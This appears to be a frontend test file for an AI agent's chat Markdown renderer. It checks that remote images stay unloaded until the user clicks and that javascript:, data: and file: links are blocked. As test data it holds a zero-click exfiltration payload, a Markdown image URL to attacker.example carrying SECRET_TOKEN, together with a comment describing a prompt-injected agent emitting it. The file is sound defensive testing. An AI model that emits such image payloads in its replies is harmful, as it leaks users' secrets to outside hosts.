import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import type { ReactNode } from "react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { Markdown } from "@/components/thread/markdown";
import { ClientProvider } from "@/lib/api";
import { createHttpClient } from "@/lib/api/http-client";
import { imageSource } from "@/lib/markdown-images";

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

// Issue #317: a prompt-injected agent ends its reply with an image whose URL carries data.
const exfil = "Done.\n\n![](https://attacker.example/?d=SECRET_TOKEN)";
const origin = window.location.origin;

/** Every element in the container that would make the browser fetch a remote URL. */
function remoteFetches(container: HTMLElement): string[] {
  return [...container.querySelectorAll("img, source, picture, video, audio")]
    .map((el) => el.getAttribute("src") ?? el.getAttribute("srcset") ?? "")
    .filter((src) => /^(https?:)?\/\//i.test(src) && !src.startsWith(origin));
}

const client = createHttpClient(origin);
const wrapper = ({ children }: { children: ReactNode }) => (
  <ClientProvider client={client}>{children}</ClientProvider>
);

/** The server's side of a click: each `POST /api/remote-image` gets the next single-use id. */
function grantImages() {
  let next = 0;
  return vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
    next += 1;
    const grant = { id: `grant-id-0000000${next}`, expiresAt: new Date().toISOString() };
    return new Response(JSON.stringify(grant), {
      headers: { "content-type": "application/json" },
    });
  });
}

/** What each click asked the server for: the method, path and URL. */
const clicks = (fetch: ReturnType<typeof grantImages>) =>
  fetch.mock.calls.map(([input, init]) => [
    init?.method,
    String(input),
    JSON.parse(String(init?.body)).url,
  ]);

describe("Markdown: remote images (#317)", () => {
  it("does not load a remote image in an agent reply until the user asks", async () => {
    const fetch = grantImages();
    const { container } = render(<Markdown>{exfil}</Markdown>, { wrapper });
    await screen.findByText("Done.");
    // The browser fetches an <img src> as soon as it is in the DOM: zero-click exfiltration.
    expect(remoteFetches(container)).toEqual([]);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("attacker.example");
    expect(fetch).not.toHaveBeenCalled();

    fireEvent.click(screen.getByRole("button", { name: "Load image from attacker.example" }));
    await waitFor(() => expect(container.querySelector("img")).not.toBeNull());
    // The click asks the server for that exact URL, and the image loads from the single-use
    // address it answers: Agent Rishi's server, the only image source the UI's CSP allows (#341).
    expect(clicks(fetch)).toEqual([
      ["POST", `${origin}/api/remote-image`, "https://attacker.example/?d=SECRET_TOKEN"],
    ]);
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe(`${origin}/api/remote-image/grant-id-00000001`);
    expect(remoteFetches(container)).toEqual([]);
  });

  it("loads only the exact URL clicked: a changed source shows the placeholder again (#341)", async () => {
    const fetch = grantImages();
    // A GitHub issue body its author edits after the user loaded its image.
    const a = "https://images.example/a.png";
    const b = "https://images.example/b.png?d=SECRET_TOKEN";
    const { container, rerender } = render(<Markdown>{`Issue\n\n![shot](${a})`}</Markdown>, {
      wrapper,
    });
    await screen.findByText("Issue");
    fireEvent.click(screen.getByRole("button", { name: "Load image from images.example" }));
    await waitFor(() => expect(container.querySelector("img")).not.toBeNull());

    rerender(<Markdown>{`Issue\n\n![shot](${b})`}</Markdown>);
    await screen.findByText("Issue");
    // No <img> for B: the browser would request it the moment it rendered.
    expect([...container.querySelectorAll("img")].map((i) => i.getAttribute("src"))).toEqual([]);
    expect(screen.getByRole("button", { name: "Load image from images.example" })).toBeTruthy();
    // And no request for B either: only A's click reached the server.
    expect(clicks(fetch)).toEqual([["POST", `${origin}/api/remote-image`, a]]);

    // Its own click loads B, from a new address.
    fireEvent.click(screen.getByRole("button", { name: "Load image from images.example" }));
    await waitFor(() => expect(container.querySelector("img")).not.toBeNull());
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      `${origin}/api/remote-image/grant-id-00000002`,
    );
    expect(clicks(fetch).at(-1)).toEqual(["POST", `${origin}/api/remote-image`, b]);
  });

  it("holds back raw HTML images and picture sources too", async () => {
    const html = [
      "Look:",
      "",
      '<img src="https://raw.example/x.png" srcset="https://srcset.example/x.png 2x">',
      "",
      '<picture><source srcset="https://pic.example/a.png"><img src="https://pic.example/b.png"></picture>',
    ].join("\n");
    const { container } = render(<Markdown>{html}</Markdown>, { wrapper });
    await screen.findByText("Look:");
    expect(remoteFetches(container)).toEqual([]);
    expect(container.querySelector("source, img")).toBeNull();
    expect(screen.getAllByRole("button", { name: /^Load image from / })).toHaveLength(2);
  });

  it("shows inline images and Agent Rishi's own artifacts at once", async () => {
    const png = "data:image/png;base64,iVBORw0KGgo=";
    const md = `Here: ![chart](${png}) ![shot](${origin}/api/artifacts/a1)`;
    const { container } = render(<Markdown>{md}</Markdown>, { wrapper });
    await screen.findByText(/Here:/);
    const srcs = [...container.querySelectorAll("img")].map((i) => i.getAttribute("src"));
    expect(srcs).toEqual([png, `${origin}/api/artifacts/a1`]);
    expect(screen.queryByRole("button", { name: /Load image/ })).toBeNull();
  });

  it("refuses javascript: and data: links and confirms others before opening", async () => {
    const md = "[a](javascript:alert(1)) [b](data:text/html,<b>x</b>) [c](https://example.com/c)";
    const { container } = render(<Markdown>{md}</Markdown>);
    const link = await screen.findByRole("button", { name: "c" });
    expect(container.querySelector('[href^="javascript:"], [href^="data:"]')).toBeNull();
    expect(container.textContent).toContain("[blocked]");
    const open = vi.spyOn(window, "open").mockReturnValue(null);
    fireEvent.click(link);
    expect(open).not.toHaveBeenCalled();
    const dialog = await screen.findByRole("dialog", { name: "Open this link?" });
    expect(dialog.textContent).toContain("https://example.com/c");
    fireEvent.click(within(dialog).getByRole("button", { name: "Open link" }));
    expect(open).toHaveBeenCalledWith("https://example.com/c", "_blank", "noreferrer");
  });
});

describe("imageSource (#317)", () => {
  const origins = ["http://127.0.0.1:4317"];
  it("loads only inline images and stored artifacts by themselves", () => {
    for (const src of [
      "data:image/png;base64,AAAA",
      "blob:http://127.0.0.1:4317/0b1c",
      "streamdown:incomplete-image",
      "http://127.0.0.1:4317/api/artifacts/a1",
    ]) {
      expect(imageSource(src, origins), src).toEqual({ kind: "local" });
    }
  });

  it("holds back other hosts and names the real one behind Agent Rishi's image fetch", () => {
    expect(imageSource("https://Attacker.example:8443/x?d=1", origins)).toEqual({
      kind: "remote",
      url: "https://attacker.example:8443/x?d=1",
      host: "attacker.example:8443",
    });
    const wrapped = `http://127.0.0.1:4317/api/remote-image?url=${encodeURIComponent("https://evil.example/p")}`;
    expect(imageSource(wrapped, origins)).toMatchObject({ kind: "remote", host: "evil.example" });
    expect(imageSource("//cdn.example/x.png", origins)).toEqual({ kind: "blocked" });
  });

  it("never loads other schemes or other Agent Rishi URLs", () => {
    for (const src of [
      undefined,
      "javascript:alert(1)",
      "file:///etc/passwd",
      "data:text/html,<b>x</b>",
      "http://127.0.0.1:4317/api/sessions/s1/snapshot",
      "http://127.0.0.1:4317/api/artifacts/a1?download=1",
      // A single-use image address written into Markdown is never loaded as it is (#341).
      "http://127.0.0.1:4317/api/remote-image/grant-id-00000001",
      "/api/artifacts/a1",
    ]) {
      expect(imageSource(src, origins), String(src)).toEqual({ kind: "blocked" });
    }
  });
});
